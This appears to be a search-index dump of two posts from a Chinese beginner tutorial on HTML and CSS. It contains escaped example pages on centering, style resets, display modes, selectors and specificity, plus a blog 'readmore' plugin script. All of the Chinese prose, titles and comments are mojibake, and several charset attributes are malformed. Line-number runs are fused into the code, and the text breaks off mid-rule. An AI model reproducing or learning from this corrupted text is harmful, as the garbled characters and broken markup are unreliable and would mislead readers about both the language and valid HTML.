12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;å—å…ƒç´ æ°´å¹³å±…ä¸­&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; text-align: center; background: pink; } .box2 { width: 50px; height: 50px; /* è®©å—å…ƒç´ æ°´å¹³å±…ä¸­äºçˆ¶å…ƒç´ ï¼šè®¾ç½®æ°´å¹³å·¦å³æ–¹å‘çš„å¤–è¾¹è·ä¸ºè‡ªé€‚åº” */ margin: 0 auto; background: greenyellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; ç›’å­ &lt;div class="box2"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š æ¸…é™¤æ ‡ç­¾é»˜è®¤æ ·å¼HTML æ ‡ç­¾ä¸€èˆ¬éƒ½æœ‰é»˜è®¤çš„ CSS å±æ€§ï¼Œè‹¥å¸Œæœ›å»æ‰é»˜è®¤çš„ CSS å±æ€§ï¼ˆCSS åˆå§‹åŒ–ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ¥å®ç°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="â€œutf-8"&gt; &lt;title&gt;æ¸…é™¤æ ‡ç­¾é»˜è®¤æ ·å¼(CSSåˆå§‹åŒ–)&lt;/title&gt; &lt;style type="text/css"&gt; /* ç¬¬ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨æ˜Ÿå·ï¼ˆé€šé…ç¬¦ï¼‰ï¼Œè¡¨ç¤ºæ‰€æœ‰Htmlæ ‡ç­¾ï¼Œåœ¨å·¥ä½œä¸­ä¸å»ºè®®ä½¿ç”¨æ­¤æ–¹å¼ */ * { margin: 0; padding: 0; } /* ç¬¬äºŒç§æ–¹å¼ï¼šåˆå§‹åŒ–å°†ç”¨åˆ°çš„æ ‡ç­¾ï¼Œè¿™æ ·å¯ä»¥æé«˜æ‰§è¡Œæ•ˆç‡ï¼Œåœ¨å·¥ä½œä¸­å»ºè®®ä½¿ç”¨æ­¤æ–¹å¼*/ body,h1,h2,h3,h4,h5,h6,ul,ol,dl,dt,dd,p{ margin: 0; padding: 0; } .box { background: pink; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;h1&gt;æ ‡é¢˜&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;åˆ—è¡¨1&lt;/li&gt; &lt;li&gt;åˆ—è¡¨2&lt;/li&gt; &lt;li&gt;åˆ—è¡¨3&lt;/li&gt; &lt;/ul&gt; &lt;dl&gt; &lt;dt&gt;åˆ—è¡¨4&lt;/dt&gt; &lt;dt&gt;åˆ—è¡¨5&lt;/dt&gt; &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; å—å…ƒç´ çš„é»˜è®¤å®½åº¦ å—å…ƒç´ çš„é»˜è®¤å®½åº¦ï¼šå—å…ƒç´ åœ¨ä¸è®¾ç½®å›ºå®šå®½åº¦æ—¶ï¼Œå…¶é»˜è®¤çš„å®½åº¦å’Œçˆ¶å…ƒç´ ï¼ˆcontent åŒºåŸŸï¼‰ä¸€æ · å—å…ƒç´ çš„é»˜è®¤é¢ç§¯ç»„æˆï¼šmargin + border + padding + content 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="â€œutf-8"&gt; &lt;title&gt;å—å…ƒç´ çš„é»˜è®¤é«˜åº¦&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 300px; background: pink; } .box2 { height: 100px; background: red; padding-left: 30px; border-left: 20px solid blue; margin-left: 10px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; &lt;div class="box2"&gt;æ–‡æœ¬å†…å®¹&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š img æ ‡ç­¾åº•éƒ¨ç•™ç™½ç”±äº img æ ‡ç­¾æ˜¯è¡Œå†…å—å…ƒç´ ï¼Œåº•éƒ¨ä¼šå’Œæ–‡æœ¬çš„åŸºçº¿å¯¹é½ï¼Œæ‰€æœ‰ä¼šç•™æœ‰ä¸€éƒ¨åˆ†ç©ºç™½ã€‚å»é™¤åº•éƒ¨ç•™ç™½çš„æ–¹æ¡ˆå¦‚ä¸‹ï¼š ç¬¬ä¸€ç§æ–¹æ¡ˆï¼šå°† img æ ‡ç­¾è½¬æ¢æˆå—å…ƒç´ ï¼šdisplay:block ç¬¬äºŒç§æ–¹æ¡ˆï¼šå°† box çš„å­—ä½“å¤§å°è®¾ç½®æˆ 0 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="â€œutf-8"&gt; &lt;title&gt;è§£å†³imgåº•éƒ¨ç•™æœ‰ç©ºç™½çš„é—®é¢˜&lt;/title&gt; &lt;style type="text/css"&gt; .box { border: 1px solid red; /* ç¬¬ä¸€ç§ */ /* font-size: 0; */ } .box img { /* ç¬¬äºŒç§ï¼ˆæ¨èï¼‰ */ display: block; } img { width: 300px; height: 150px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt;å›¾ç‰‡ &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; CSS å®æˆ˜a æ ‡ç­¾å¯¼èˆªå­¦ä¹ ç›®æ ‡ï¼šç†Ÿæ‚‰è¡Œé«˜å±æ€§çš„åº”ç”¨ æœ‰ä¸ª 5 ä¸ª a æ ‡ç­¾ï¼Œé»˜è®¤çŠ¶æ€ï¼šå®½æ˜¯ 100ï¼Œé«˜æ˜¯ 30ï¼ŒèƒŒæ™¯è‰²æ˜¯ yellowï¼Œå­—ä½“é¢œè‰²æ˜¯ greenï¼Œæ–‡æœ¬æ°´å¹³ä¸”å±…ä¸­äº a æ ‡ç­¾ï¼Œå»æ‰ä¸‹åˆ’çº¿ é¼ æ ‡ç§»å…¥ a æ ‡ç­¾æ—¶ï¼ŒèƒŒæ™¯è‰²å˜æˆ yellowgreenï¼Œå­—ä½“é¢œè‰²å˜æˆ redï¼ŒåŠ ä¸Šä¸‹åˆ’çº¿ 5 ä¸ª a æ ‡ç­¾æ°´å¹³å±…ä¸­äº boxï¼Œä¸” box çš„èƒŒæ™¯è‰²æ˜¯ pink 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;aæ ‡ç­¾å¯¼èˆª&lt;/title&gt; &lt;style type="text/css"&gt; .box { background-color: pink; height: 40px; line-height: 40px; text-align: center; } .box a { width: 100px; height: 30px; line-height: 30px; color: green; display: inline-block; text-decoration: none; background-color: yellow; } .box a:hover { color: red; text-decoration: underline; background-color: yellowgreen; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;a href="##"&gt;å¯¼èˆª&lt;/a&gt; &lt;a href="##"&gt;å¯¼èˆª&lt;/a&gt; &lt;a href="##"&gt;å¯¼èˆª&lt;/a&gt; &lt;a href="##"&gt;å¯¼èˆª&lt;/a&gt; &lt;a href="##"&gt;å¯¼èˆª&lt;/a&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"å‰ç«¯å…¥é—¨åŸºç¡€ä¹‹ HTML ä¸ CSS ä¹‹äºŒ",url:"/posts/917845c1.html",text:'CSS åŸºç¡€å¸¸ç”¨æ–‡æœ¬å±æ€§123456789101112/* å­—ä½“é¢œè‰² */color: blue;/* å­—ä½“å¤§å°ï¼ŒChromeé»˜è®¤å­—ä½“å¤§å°æ˜¯16px */font-size: 60px; /* å­—ä½“ç±»å‹ï¼ŒChromeé»˜è®¤å­—ä½“ç±»å‹æ˜¯å¾®è½¯é›…é»‘ï¼›å­—ä½“å¯ä»¥è®¾ç½®å¤šä¸ªï¼Œç”¨é€—å·éš”å¼€ï¼ŒæŒ‰ç…§é¡ºåºä¾æ¬¡è¯†åˆ«ï¼Œå¦‚æœå…¨éƒ¨å­—ä½“éƒ½ä¸è¢«è¯†åˆ«ï¼Œåˆ™ä½¿ç”¨ç³»ç»Ÿé»˜è®¤å­—ä½“ */font-family: "å®‹ä½“";/* æ°´å¹³æ°´å¹³å±…ä¸­ */text-align: center;/* å­—ä½“åŠ ç²—ï¼Œæ­£å¸¸å€¼æ˜¯400æˆ–è€…normalï¼ŒåŠ ç²—æ˜¯700 */font-weight: 700;/* é¦–è¡Œç¼©è¿›ï¼Œå»ºè®®ä½¿ç”¨ em å•ä½ï¼š 1em = å½“å‰ä¸€ä¸ªå­—ä½“çš„å¤§å° */text-indent: 2em; è®¾ç½®é¢œè‰²çš„æ–¹å¼123456789/* ç¬¬ä¸€ç§æ–¹å¼: ç”¨å•è¯çš„æ–¹å¼ */color: blue;/* ç¬¬äºŒç§æ–¹å¼: åè¿›åˆ¶çš„æ–¹å¼ */color: rgb(183, 155, 55);/* ç¬¬ä¸‰ç§æ–¹å¼: åå…­è¿›åˆ¶çš„æ–¹å¼ */color: #ff0000;/* åŸºäºç¬¬ä¸‰ç§æ–¹å¼ï¼Œå½“ä¸‰ç§é¢œè‰²æ¯ä¸¤ä½çš„æ•°å€¼éƒ½ç›¸åŒï¼Œåˆ™å¯ä»¥ç®€å†™ */color: #f40;color: #f00; ç›’å­çš„åŸºæœ¬ä¸‰å±æ€§ç›’å­æŒ‡çš„å°±æ˜¯æ ‡ç­¾ï¼Œåœ¨ç½‘é¡µä¸­éƒ½æ˜¯ç”±ä¸€ä¸ªä¸€ä¸ªå¤§å¤§å°å°çš„ç›’å­ç»„æˆï¼Œå…¶ä¸­çš„ä¸‰ä¸ªåŸºæœ¬å±æ€§å¦‚ä¸‹ï¼š widthï¼šå®½åº¦ heightï¼šé«˜åº¦ backgroundï¼šèƒŒæ™¯è‰² 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;ç›’å­çš„åŸºæœ¬ä¸‰å±æ€§&lt;/title&gt; &lt;style type="text/css"&gt; div { /* å®½åº¦ */ width: 200px; /* é«˜åº¦ */ height: 200px; /* èƒŒæ™¯è‰² */ background: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; æ˜¾ç¤ºæ¨¡å¼ä¸‰ç§æ˜¾ç¤ºæ¨¡å¼æç¤º ç›’å­çš„æ˜¾ç¤ºæ¨¡å¼å±äºå—çº§æ˜¾ç¤ºæ¨¡å¼ å—çº§æ˜¾ç¤ºæ¨¡å¼ ç‹¬å ä¸€è¡Œæ˜¾ç¤ºï¼Œè®¾ç½®å®½é«˜åèµ·ä½œç”¨ï¼›åœ¨æ²¡æœ‰è®¾ç½®å®½åº¦çš„æ—¶å€™ï¼Œå…¶é»˜è®¤å®½åº¦ä¸çˆ¶å…ƒç´ çš„å®½åº¦ä¸€è‡´ï¼Œè€Œé»˜è®¤é«˜åº¦æ˜¯ 0 æ‹¥æœ‰å—çº§æ˜¾ç¤ºæ¨¡å¼çš„å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰ï¼š&lt;html&gt;ã€&lt;body&gt;ã€&lt;div&gt;ã€&lt;h1&gt; - &lt;h6&gt;ã€&lt;p&gt;ã€&lt;ul&gt;ã€&lt;ol&gt;ã€&lt;li&gt;ã€&lt;dl&gt;ã€&lt;dt&gt;ã€&lt;dd&gt;ã€&lt;hr&gt;ã€&lt;form&gt; è¡Œå†…æ˜¾ç¤ºæ¨¡å¼ ä¸€è¡Œæœ‰å¤šä¸ªå…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰ï¼Œè®¾ç½®å®½é«˜ä¸ä¼šèµ·ä½œç”¨ï¼Œå°ºå¯¸ç”±å†…å®¹å¤§å°å†³å®šï¼›åœ¨æ²¡æœ‰è®¾ç½®å†…å®¹æ—¶ï¼Œå…¶é»˜è®¤å®½åº¦å’Œé«˜åº¦éƒ½æ˜¯ 0ï¼›å½“è¡Œå†…å…ƒç´ æœ‰ä¸€ä¸ªåŠä»¥ä¸Šçš„ç©ºæ ¼ç¬¦æˆ–è€…æ¢è¡Œç¬¦æ—¶ï¼Œæ˜¾ç¤ºæ•ˆæœä¹‹å‰ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„é—´è· æ‹¥æœ‰è¡Œå†…æ˜¾ç¤ºæ¨¡å¼çš„å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰ï¼š&lt;span&gt;ã€&lt;b&gt;ã€&lt;i&gt;ã€&lt;s&gt;ã€&lt;u&gt;ã€&lt;strong&gt;ã€&lt;em&gt;ã€&lt;del&gt;ã€&lt;ins&gt; è¡Œå†…å—æ˜¾ç¤ºæ¨¡å¼ï¼š è¡Œå†…å—æ˜¾ç¤ºæ¨¡å¼ï¼šå³ä¸€è¡Œæœ‰å¤šä¸ªå…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰ï¼Œè®¾ç½®å®½é«˜åä¼šèµ·ä½œç”¨ è¡Œå†…å—æ˜¾ç¤ºæ¨¡å¼çš„å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰ï¼š&lt;img&gt;ã€è¡¨å•æ ‡ç­¾ï¼ˆä¾‹å¦‚ &lt;input&gt;ã€&lt;textarea&gt;ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;æ˜¾ç¤ºæ¨¡å¼&lt;/title&gt; &lt;style type="text/css"&gt; div { /* å®½åº¦ */ width: 200px; /* é«˜åº¦ */ height: 200px; /* èƒŒæ™¯è‰² */ background: blue; } i { background: red; } span { background: blue; } img { width: 60px; height: 60px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt; &lt;i&gt;é•‡&lt;/i&gt; &lt;i&gt;é•‡&lt;/i&gt; &lt;span&gt;ä¸Š&lt;/span&gt; &lt;span&gt;ä¸Š&lt;/span&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š æ˜¾ç¤ºæ¨¡å¼è½¬æ¢ æ˜¾ç¤ºæ¨¡å¼è½¬æ¢ å…¶å®ƒæ˜¾ç¤ºæ¨¡å¼è½¬æ¢æˆå—çº§æ˜¾ç¤ºæ¨¡å¼: display: block å…¶å®ƒæ˜¾ç¤ºæ¨¡å¼è½¬æ¢æˆè¡Œå†…å—æ˜¾ç¤ºæ¨¡å¼: display: inline-block 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;æ˜¾ç¤ºæ¨¡å¼è½¬æ¢&lt;/title&gt; &lt;style type="text/css"&gt; div { /* å®½åº¦ */ width: 200px; /* é«˜åº¦ */ height: 200px; /* èƒŒæ™¯è‰² */ background: blue; /* è½¬æ¢æˆè¡Œå†…å—æ˜¾ç¤ºæ¨¡å¼ */ display: inline-block; } span { /* å®½åº¦ */ width: 100px; /* é«˜åº¦ */ height: 100px; /* èƒŒæ™¯è‰² */ background: red; /* è½¬æ¢æˆè¡Œå†…å—æ˜¾ç¤ºæ¨¡å¼ */ display: inline-block; } b { /* å®½åº¦ */ width: 100px; /* é«˜åº¦ */ height: 100px; /* èƒŒæ™¯è‰² */ background: yellow; /* è½¬æ¢æˆå—çº§æ˜¾ç¤ºæ¨¡å¼ */ display: block; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;b&gt;&lt;/b&gt; &lt;b&gt;&lt;/b&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š é€‰æ‹©å™¨æ ‡ç­¾é€‰æ‹©å™¨ æ ‡ç­¾é€‰æ‹©å™¨ å®šä¹‰çš„è¯­æ³•ï¼š æ ‡ç­¾å { å±æ€§1; å±æ€§2; ...} 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;æ ‡ç­¾é€‰æ‹©å™¨&lt;/title&gt; &lt;style type="text/css"&gt; h1 { color: red; } h2 { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Java&lt;/h1&gt; &lt;h2&gt;Python&lt;/h2&gt; &lt;h2&gt;JavaScript&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; ç±»é€‰æ‹©å™¨ ç±»é€‰æ‹©å™¨ å®šä¹‰ç±»åï¼šç”¨ç‚¹å¼€å¤´ + ç±»åç§° è°ƒç”¨ç±»åï¼šç”¨æ ‡ç­¾çš„ class å±æ€§æŒ‡å®šç±»å ç±»åçš„å‘½åè§„èŒƒï¼šä¸èƒ½ç”¨æ•°å­—å¼€å¤´ï¼Œå¯ä»¥ç”¨å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å¼€å¤´ï¼Œåé¢å¯ä»¥åŠ ä¸Šå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€ä¸­åˆ’çº¿ å»ºè®®ä½¿ç”¨é©¼å³°å‘½åæ³•ï¼šç¬¬ä¸€ä¸ªå•è¯é¦–å­—æ¯å°å†™ï¼Œä»ç¬¬äºŒä¸ªå•è¯å¼€å§‹é¦–å­—æ¯å¤§å†™ 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;ç±»é€‰æ‹©å™¨&lt;/title&gt; &lt;style type="text/css"&gt; .red { color: red; } .blue { color: blue; } .green { color: green; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 class="red"&gt;Java&lt;/h1&gt; &lt;h2 class="blue"&gt;Python&lt;/h2&gt; &lt;h2 class="green"&gt;JavaScript&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; ID é€‰æ‹©å™¨ ID é€‰æ‹©å™¨ å®šä¹‰ ID åç§°ï¼šç”¨ # å¼€å¤´ + ID åç§° è°ƒç”¨ ID åç§°ï¼šç”¨æ ‡ç­¾çš„ id å±æ€§æŒ‡å®š ID åç§° å”¯ä¸€æ€§ï¼šæ ‡ç­¾çš„ id å±æ€§æŒ‡å®šçš„ ID åç§°ä¸€èˆ¬å…¨å±€å”¯ä¸€ 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf=8"&gt; &lt;title&gt;IDé€‰æ‹©å™¨&lt;/title&gt; &lt;style type="text/css"&gt; #one { color: red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 id="one"&gt;Hello Wolrd!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; å¤šç±»åè°ƒç”¨å½“ä¸€ä¸ªä»£ç ç‰‡æ®µé‡å¤æ€§çš„å‡ºç°æ—¶ï¼Œä¼šé€ æˆä»£ç æ‰§è¡Œæ•ˆç‡é™ä½ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨å¤šç±»åè°ƒç”¨æ¥è§£å†³ä»£ç å†—ä½™é—®é¢˜ã€‚å¤šç±»åè°ƒç”¨çš„è¯­æ³•ï¼šæ ‡ç­¾å¯ä»¥è°ƒç”¨å¤šä¸ªç±»åï¼Œç±»åä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ã€‚ 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;å¤šç±»åè°ƒç”¨&lt;/title&gt; &lt;style type="text/css"&gt; .font { font-size: 80px; } .red { color: #DB4732; } .blue { color: #1B6FEF; } .green { color: #009A57; } .yellow { color: #FFD669; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;span class="blue font"&gt;G&lt;/span&gt;&lt;span class="red font"&gt;o&lt;/span&gt;&lt;span class="yellow font"&gt;o&lt;/span&gt;&lt;span class="blue font"&gt;g&lt;/span&gt;&lt;span class="green font"&gt;l&lt;/span&gt;&lt;span class="red font"&gt;e&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; åä»£é€‰æ‹©å™¨ ä½¿ç”¨ç©ºæ ¼åˆ†éš”å¤šä¸ªé€‰æ‹©å™¨ ç©ºæ ¼è¡¨ç¤ºåä»£ï¼Œç©ºæ ¼åé¢çš„é€‰æ‹©å™¨æ˜¯åä»£é€‰æ‹©å™¨ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;åä»£é€‰æ‹©å™¨&lt;/title&gt; &lt;style text="text/css"&gt; .backend h1 { color: blue; } .backend .go { color: blueviolet; } .backend div h3 { color: green; } .fontend h1 { color: red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="backend"&gt; &lt;h1&gt;åç«¯&lt;/h1&gt; &lt;h3 class="go"&gt;Go&lt;/h3&gt; &lt;h3&gt;PHP&lt;/h3&gt; &lt;h3&gt;Java&lt;/h3&gt; &lt;h3&gt;Python&lt;/h3&gt; &lt;div&gt; &lt;h3&gt;C#&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="fontend"&gt; &lt;h1&gt;å‰ç«¯&lt;/h1&gt; &lt;h3&gt;Vue&lt;/h3&gt; &lt;h3&gt;NodeJs&lt;/h3&gt; &lt;h3&gt;Webpack&lt;/h3&gt; &lt;h3&gt;TypeScript&lt;/h3&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; å¹¶é›†é€‰æ‹©å™¨ å¹¶é›†é€‰æ‹©å™¨ï¼šå°†å¤šä¸ªé€‰æ‹©å™¨ä½¿ç”¨é€—å·éš”å¼€ï¼Œå®ç°å…±åŒçš„å±æ€§è®¾ç½® 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="â€œutf-8"&gt; &lt;title&gt;å¹¶é›†é€‰æ‹©å™¨&lt;/title&gt; &lt;style type="text/css"&gt; span, p, h1 { color: red; } .box h2, .box h3 { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;span&gt;span&lt;/span&gt; &lt;p&gt;æ®µè½&lt;/p&gt; &lt;h1&gt;æ ‡é¢˜1&lt;/h1&gt; &lt;h2&gt;æ ‡é¢˜2&lt;/h2&gt; &lt;h3&gt;æ ‡é¢˜3&lt;/h3&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; CSS ä¹¦å†™ä½ç½® CSS çš„ä¹¦å†™ä½ç½® ç¬¬ä¸€ç§ï¼šå†…åµŒå¼ï¼Œåœ¨å·¥ä½œä¸­å¶å°”ä¼šä½¿ç”¨ ç¬¬äºŒç§ï¼šè¡Œå†…å¼ï¼Œåœ¨å·¥ä½œä¸­å¶å°”ä¼šä½¿ç”¨ ç¬¬ä¸‰ç§ï¼šå¤–é“¾å¼ï¼Œåœ¨å·¥ä½œä¸­ç»å¸¸ä¼šä½¿ç”¨ï¼ˆæ¨èï¼‰ 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;!-- ç¬¬ä¸€ç§ï¼šå†…åµŒå¼ï¼Œæ˜¯å°†CSSä»£ç åµŒå…¥åˆ°HTMLæ–‡ä»¶ä¸­ï¼ŒCSSä»£ç å’ŒHTMLä»£ç ç›¸å¯¹åˆ†ç¦»ï¼Œä»£ç è€¦åˆåº¦ç›¸å¯¹è¾ƒä½ï¼Œåœ¨å·¥ä½œä¸­å¶å°”ä¼šä½¿ç”¨ --&gt; &lt;style type="text/CSS"&gt; .one { color:red; } &lt;/style&gt; &lt;!-- ç¬¬ä¸‰ç§ï¼šå¤–é“¾å¼ï¼Œæ˜¯å°†CSSä»£ç å•ç‹¬å†™åœ¨CSSæ–‡ä»¶ä¸­ï¼ŒCSSä»£ç å’ŒHTMLä»£ç ç»å¯¹åˆ†ç¦»ï¼Œä»£ç è€¦åˆåº¦æä½ï¼Œåœ¨å·¥ä½œä¸­ç»å¸¸ä¼šä½¿ç”¨ --&gt; &lt;link rel="stylesheet" type="text/css" href="one.css" /&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- ç¬¬äºŒç§ï¼šè¡Œå†…å¼ï¼Œæ˜¯å°†CSSä»£ç å†™åœ¨HTMLä¸­ï¼Œä¸¤ç§ä»£ç æºæ‚åœ¨ä¸€èµ·ï¼Œä»£ç è€¦åˆå¾ˆé«˜ï¼Œä¼šæœ‰ä»£ç å†—ä½™ï¼Œä¸”éš¾ä»¥ç»´æŠ¤ï¼Œåœ¨å·¥ä½œä¸­å¶å°”ä¼šä½¿ç”¨ --&gt; &lt;div style="width: 100px; height: 100px; background: red;"&gt;æˆ‘æ˜¯div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;æˆ‘æ˜¯div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;æˆ‘æ˜¯div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;æˆ‘æ˜¯div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;æˆ‘æ˜¯div&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; CSS å±‚å æ€§å±‚å æ€§åŸºç¡€ CSS å±‚å æ€§ ä¸åŒçš„å±æ€§éƒ½å¯ä»¥å®ç°å®šä¹‰ ç›¸åŒçš„å±æ€§ï¼Œä¸”åœ¨æƒé‡ç›¸åŒæ—¶ï¼Œåå®šä¹‰çš„ä¼šå±‚å ï¼ˆè¦†ç›–ï¼‰å…ˆå®šä¹‰çš„ åœ¨æƒé‡ä¸åŒæ—¶ï¼Œè°çš„æƒé‡å€¼é«˜ï¼Œåˆ™å®ç°è°çš„ï¼Œæƒé‡è§„åˆ™ä¸ºï¼š æ ‡ç­¾é€‰æ‹©å™¨ &lt; ç±»é€‰æ‹©å™¨ &lt; ID é€‰æ‹©å™¨ &lt; è¡Œå†…æ ·å¼ &lt; !important 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;å±‚å æ€§&lt;/title&gt; &lt;style type="text/css"&gt; #gray { color: gray; } .pink { color: pink; } .green { color: green; } div { color: red !important; font-family: "å®‹ä½“"; } div { font-size: 40px; } div { font-weight: 700; color: blue; } div { font-size: 50px; color: yellow; text-align: center; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="pink green" id="gray" style="color:skyblue"&gt;æˆ‘æ˜¯div&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š å±‚å æ€§è¿›é˜¶CSS çš„ä¸‰ç§ä¹¦å†™ä½ç½®ï¼Œéƒ½éµå¾ªä¸Šé¢ä»‹ç»çš„å±‚å æ€§è§„åˆ™ã€‚ one.css 123.div { color: red;} demo.html 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;å±‚å æ€§&lt;/title&gt; &lt;link rel="stylesheet" type="text/css" href="./one.css"&gt;&lt;/link&gt; &lt;style type="text/css"&gt; div { 